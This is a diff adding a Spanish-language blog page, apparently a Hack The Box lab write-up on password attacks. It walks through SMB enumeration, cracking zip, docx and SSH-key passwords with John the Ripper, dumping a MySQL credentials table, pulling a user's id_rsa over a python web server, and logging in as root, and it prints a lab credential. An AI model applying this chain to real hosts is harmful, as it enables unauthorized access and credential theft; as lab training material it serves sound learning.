@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head><title>
+    
+    Laboratorio De Ataques De Contraseña - Medio | 
+    
+    CHL Blog
+</title>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<link rel="canonical" href="https://chlorenzo.com/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-ataques-de-contrase%C3%B1a---medio/" />
+<link rel="icon" type="image/png" href="https://chlorenzo.com/image/favicon.ico">
+
+
+<meta name="description" content="
+    Enunciado Nuestro próximo host es una estación de trabajo que utiliza un empleado para su trabajo diario. Este tipo de hosts se utilizan a menudo para intercambiar archivos con otros empleados y suelen ser administrados por administradores a través de la red.
+    "
+/>
+<meta property="og:description" content="
+    Enunciado Nuestro próximo host es una estación de trabajo que utiliza un empleado para su trabajo diario. Este tipo de hosts se utilizan a menudo para intercambiar archivos con otros empleados y suelen ser administrados por administradores a través de la red.
+    " 
+/>
+
+
+
+
+<meta property="og:title" content="Laboratorio de Ataques de Contraseña - Medio" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://chlorenzo.com/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-ataques-de-contrase%C3%B1a---medio/" /><meta property="article:section" content="pagina_web" />
+<meta property="article:published_time" content="2025-05-28T00:00:00+00:00" />
+<meta property="article:modified_time" content="2025-05-28T00:00:00+00:00" />
+
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Laboratorio de Ataques de Contraseña - Medio">
+  <meta name="twitter:description" content="Enunciado Nuestro próximo host es una estación de trabajo que utiliza un empleado para su trabajo diario. Este tipo de hosts se utilizan a menudo para intercambiar archivos con otros empleados y suelen ser administrados por administradores a través de la red.">
+
+
+  <meta itemprop="name" content="Laboratorio de Ataques de Contraseña - Medio">
+  <meta itemprop="description" content="Enunciado Nuestro próximo host es una estación de trabajo que utiliza un empleado para su trabajo diario. Este tipo de hosts se utilizan a menudo para intercambiar archivos con otros empleados y suelen ser administrados por administradores a través de la red.">
+  <meta itemprop="datePublished" content="2025-05-28T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-05-28T00:00:00+00:00">
+  <meta itemprop="wordCount" content="667">
+
+
+
+
+<link rel="stylesheet" href="https://chlorenzo.com/main.min.css">
+
+
+
+
+
+<script src="https://chlorenzo.com/bundle.js"></script>
+
+
+
+
+
+
+
+<script data-ad-client="adsense-key" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-4G9W14SLG4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4G9W14SLG4');
+</script>
+
+
+
+
+
+
+</head>
+
+<body><header id="header">
+  <div class="top-bar">
+    <div class="container-md">
+
+      <div class="row align-items-center">
+        <div class="col-3 col-sm-4 social-buttons d-none d-sm-block">
+          <ul>
+    
+    
+
+    
+    <li>
+        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
+            <i class="fab fa-youtube"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://www.instagram.com/19chl96/" target="_blank">
+            <i class="fab fa-instagram"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://github.com/chernadez321" target="_blank">
+            <i class="fab fa-github"></i></a>
+    </li>
+    
+
+    
+
+    
+    <li>
+        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
+            <i class="fab fa-linkedin"></i></a>
+    </li>
+    
+
+</ul>
+        </div>
+
+        <div class="ra-toggler col-3 col-sm-4 d-block d-sm-none">
+          <button class="bg-dark" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+            <i class="fas fa-bars"></i>
+          </button>
+        </div>
+
+        <div class="col-6 col-sm-4">
+          <h2 class="title"><a href="https://chlorenzo.com/">CHL Blog</a></h2>
+        </div>
+
+        
+        <div class="col-3 col-sm-4">
+          <div class="col col-md-8 offset-md-4 d-none d-sm-block">
+            <form id="cse-search-box-form-id" class="input-group search-bar" onsubmit="return executeQuery('lg');"
+              role="search">
+              <input id="cse-search-input-box-id" type="text" class="form-control" placeholder="Search">
+              <button class="btn" type="submit">
+                <i class="fa fa-search"></i>
+              </button>
+            </form>
+          </div>
+        </div>
+        
+
+      </div>
+    </div>
+  </div>
+
+  <div class="container-md">
+    <nav class="navbar navbar-expand-sm navbar-dark bg-dark sticky-top">
+      <div class="collapse navbar-collapse" id="navbarNav">
+        <ul class="navbar-nav mx-auto">
+
+          <li class="nav-item d-block d-sm-none">
+            <ul class="social-buttons">
+              <ul>
+    
+    
+
+    
+    <li>
+        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
+            <i class="fab fa-youtube"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://www.instagram.com/19chl96/" target="_blank">
+            <i class="fab fa-instagram"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://github.com/chernadez321" target="_blank">
+            <i class="fab fa-github"></i></a>
+    </li>
+    
+
+    
+
+    
+    <li>
+        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
+            <i class="fab fa-linkedin"></i></a>
+    </li>
+    
+
+</ul>
+            </ul>
+          </li>
+
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://chlorenzo.com/">
+              Home
+            </a>
+          </li>
+          
+          
+          
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown">
+              Blog
+            </a>
+            <div class="dropdown-menu">
+              
+              
+                <a class="dropdown-item" href="https://chlorenzo.com/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
+              
+              
+              
+                <a class="dropdown-item" href="https://chlorenzo.com/pagina_web/blog/write-ups/">Write-ups</a>
+              
+              
+              
+                <div class="dropdown-divider"></div>
+              
+              
+              
+                <a class="dropdown-item" href="https://chlorenzo.com/tags/">Búsqueda por etiquetas</a>
+              
+              
+            </div>
+          </li>
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://chlorenzo.com/pagina_web/trayectoria/">
+              Trayectoria
+            </a>
+          </li>
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://chlorenzo.com/pagina_web/contact/">
+              Contacto
+            </a>
+          </li>
+          
+          
+        </ul>
+
+        
+        <form id="cse-search-box-form-id2" class="d-flex search-bar d-block d-sm-none"
+          onsubmit="return executeQuery('xs');" role="search">
+          <input id="cse-search-input-box-id2" type="text" class="form-control" placeholder="Search">
+          <button class="btn" type="submit">
+            <i class="fa fa-search"></i>
+          </button>
+        </form>
+        
+
+      </div>
+    </nav>
+  </div>
+</header>
+
+<main class="blog-content">
+    <div class="container-md">
+        <div class="row">
+            
+            <div class="col-lg-2 d-none d-xl-block">
+                <div class="ad-left-offset"></div>
+                
+            </div>
+
+            <div class="col-md-12 col-lg-8 px-lg-4">
+                
+
+                <h1 class="title">Laboratorio de Ataques de Contraseña - Medio</h1>
+
+                <div class="container-fluid px-0 mb-4">
+                    <div class="row align-items-end">
+                        <div class="col-md-4 date-time">
+                            <span class="date">
+    May 28, 2025
+</span>
+                            &centerdot;
+                            <span class="time-to-read">
+    4 mins read</span>
+                        </div>
+
+                        <div class="col-md-8 tags ">
+                            
+                        </div>
+                    </div>
+                </div>
+
+                
+
+                <h4 id="enunciado">Enunciado</h4>
+<p>Nuestro próximo host es una estación de trabajo que utiliza un empleado para su trabajo diario. Este tipo de hosts se utilizan a menudo para intercambiar archivos con otros empleados y suelen ser administrados por administradores a través de la red. Durante una reunión con el cliente, nos informaron que muchos usuarios internos utilizan este host como host de acceso directo. El objetivo es proteger los archivos que contienen información confidencial.</p>
+<h4 id="enumeración-de-puertos"><strong>Enumeración de puertos</strong></h4>
+<p>Vamos con lo básico a ver qué servicios están corriendo sobre el servidor.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- -sS --min-rate <span style="color:#ae81ff">2000</span> -n -Pn &lt;IP&gt;
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/nmap1.png" alt="">
+Vemos que tenemos los puertos 22, 139 y 445 abiertos, vamos a recoger más información de los servicios que hay corriendo en cada puerto que nos salió a ver si vemos algo interesante.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p22,139,445 -sCV -n -Pn &lt;IP&gt;
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/nmap2.png" alt=""></p>
+<p>Vemos las versiones de los servicios, así como que está corriendo un Linux en el servidor.
+Procedemos a recopilar más información sobre <strong>smb</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>enum4linux-ng &lt;IP&gt;
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/enum4linux.png" alt="">
+Representándonos principalmente la siguiente información:</p>
+<ul>
+<li>Nombre del equipo: <code>SKILLS-MEDIUM</code></li>
+<li>Sistema operativo: Linux</li>
+<li>Está permitida la sesión SMB sin credenciales.</li>
+<li>Usuario válido: <code>sam</code></li>
+<li><strong>Comparticiones</strong>:
+<ul>
+<li><code>SHAREDRIVE</code></li>
+<li><code>print$</code></li>
+<li><code>IPC$</code></li>
+</ul>
+</li>
+</ul>
+<p>Entonces dado que permite la conexión sin credenciales vamos a intentar listar información del servidor.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient //&lt;IP&gt;/SHAREDRIVE -N
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/smbclient1.png" alt="">
+Vemos que tenemos un archivo <code>.zip</code>, lo descargamos</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>get Docs.zip
+</span></span></code></pre></div><p>Al intentar abrirlo nos damos cuenta que tiene contraseña con lo que procedemos a extraer el hash para luego intentar crackearlo.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>zip2john Docs.zip &gt; zip.hash
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/zip2john1.png" alt=""></p>
+<p>Utilizando los diccionarios que nos brinda el mismo módulo de ataques a contraseñas crackeamos el hash.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span>/.../mut_password.list zip.hash
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/john1.png" alt=""></p>
+<p>Dando la contraseña del archivo <strong>Destiny2022!</strong>. A continuación lo descomprimimos usando este password.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>unzip Docs.zip
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/john3.png" alt="">
+Sin embargo vemos que el archivo está encriptado.<br>
+Con lo cual usamos <code>office2john</code> para extraer su hash e intentar crackearlo posteriormente.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>office2john Documentation.docx &gt; docx.hash
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/john4.png" alt=""></p>
+<p>Igual crackeamos el hash con las wordlist que nos dieron en el modulo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span>/.../mut_password.list docx.hash
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/john2.png" alt="">
+Donde vemos que pudimos encontrar el hash correspondiente.
+Ahora procedemos a abrir el archivo <code>.docx</code>.</p>
+<p>Vemos que tenemos lo siguiente:
+<img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/root1.png" alt="">
+<code>jason:C4mNKjAtL2dydsYa6</code>
+Con las credenciales nos autenticamos por ssh para entrar al servidor.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh jason@&lt;IP&gt;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Password</span>
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/john5.png" alt="">
+Luego de revisar un poco la información del servidor con el siguiente comando podemos ver qué puertos están abiertos y qué servicios están escuchando.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ss -tuln
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/root2.png" alt="">
+Nos fijamos que tenemos escuchando los servicios 22(ssh), 53(dns), 139|445 (smb),  3306|33060(mysql).</p>
+<p>Intenamos entrar al servidor mysql con las credenciales de jason.</p>
+<p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/root3.png" alt=""></p>
+<p>Y nos lo permite, a continuación vemos las bases de datos disponibles.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#66d9ef">show</span> <span style="color:#66d9ef">databases</span>;
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/root4.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#66d9ef">use</span> users;
+</span></span></code></pre></div><p>Usamos la base de datos <code>users</code> y vemos las tablas de dicha base de datos</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#66d9ef">show</span> <span style="color:#66d9ef">tables</span>;
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/root5.png" alt="">
+Hacemos una consulta a ver que información tiene y vemos una lista de usuarios y contraseñas.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mysql" data-lang="mysql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> creds;
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/root6.png" alt=""></p>
+<p>y vemos que al final de la tabla hay tenemos las credenciales de dennis el otro usuario del servidor.</p>
+<p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/root7.png" alt=""></p>
+<p>Nos autenticamos como dennis</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>su dennis
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Password</span>
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/root8.png" alt=""></p>
+<p>En el directorio de dennis vemos que tenemos un archivo <code>.bash_history</code> y al abrirlo vemos que se crearon un par de claves ssh y luego vemos que hacen un <code>sudo -l</code>.</p>
+<p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/root9.png" alt=""></p>
+<p>Vamos a traernos a local el id_rsa del directorio personal de dennis para analizarlo mejor.
+Nos movemos en el servidor al directorio <code>/home/dennis/.ssh/</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd .ssh/
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Nos montamos un servidor python para enviar el archivo id_rsa a nuestra máquina local.</span>
+</span></span><span style="display:flex;"><span>python3 -m http.server
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#En la máquina local hacemos un wget para bajarnos el archivo id_rsa</span>
+</span></span><span style="display:flex;"><span>wget http://&lt;IP&gt;:8000/id_rsa
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/root10.png" alt=""></p>
+<p>Luego le pasamos el ssh2john para extraer su hash y ver si lo podemos crackear.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh2john id_rsa &gt; ssh.hash
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/root11.png" alt=""></p>
+<p>Lo crackeamos con la wordlist de passwords que nos dieron en el modulo luego de haberle aplicado los respectivos custom.rules.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span>/.../mut_password.list ssh.hash
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/root12.png" alt="">
+Viendo que podemos crackear el hash.</p>
+<p>A continuación usamos el <code>id_rsa</code> para autenticarnos como root</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh root@&lt;IP&gt; -i id_rsa
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/root13.png" alt=""></p>
+<p>Ya lo que queda es ir al directorio donde está la flag y leerla.</p>
+<p><img src="../../../../../images/HTB_modulos/password_atk_htb_labs_2/root14.png" alt=""></p>
+<p>Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.</p>
+
+
+                <div id="social-media-share">
+	<p><i>Escríbeme por cualquiera de las vías</i></p>
+	
+	<div class="share-buttons">
+	    
+		<a href="https://www.instagram.com/19chl96/" 
+   			target="_blank" 
+   			title="Sígueme en Instagram">
+    		<img src=https://chlorenzo.com/icons/45px/instagram.png alt="Instagram">
+		</a>
+
+		<a  href="https://www.linkedin.com/in/chlinked/"
+	        onclick="socialMediaPopUp(this.href, '', 900, 500); return false;"
+	        title="Share on LinkedIn. Opens in a new window." >
+	        <img src=https://chlorenzo.com/icons/48px/linkedin.png>
+	    </a>
+
+	    <a href="https://mail.google.com/mail/?view=cm&fs=1&to=chlorenzo96@gmail.com&su=Para Carlos&body=Hola." 
+   		   target="_blank" 
+   		   title="Enviar correo usando Gmail">
+    	<img src=https://chlorenzo.com/icons/48px/email.png alt="Email">
+		</a>
+
+		
+
+	</div>
+</div>
+
+
+
+                
+                <br>
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    (function () {
+        
+        
+        if (window.location.hostname == "localhost")
+            return;
+
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = '';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+            </div>
+
+            <div class="col-lg-2 d-none d-xl-block">
+                <div class="ad-right-offset"></div>
+                
+            </div>
+        </div>
+    </div>
+</main>
+
+<footer class="bg-dark text-light py-4">
+    <div class="container-md">
+        <div class="row justify-content-center">
+            <div class="col-12">
+                <nav class="navbar navbar-expand-sm navbar-dark bg-dark justify-content-center">
+                    <ul class="navbar-nav">
+                        <li class="nav-item">
+                            <a class="nav-link" href="https://chlorenzo.com/">Home</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="https://chlorenzo.com/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="https://chlorenzo.com/pagina_web/blog/write-ups/">Write-ups</a>
+                        </li>
+                    </ul>
+                </nav>
+            </div>
+        </div>
+    </div>
+    <div class="text-center mt-3">
+        <p>© 2025 Carlos Hernández Lorenzo</p>
+    </div>
+</footer>
+
+
+<script async src="https://cse.google.com/cse.js?cx=google-cse-key"></script>
+<gcse:searchresults-only></gcse:searchresults-only>
+
+</body>
+
+</html>
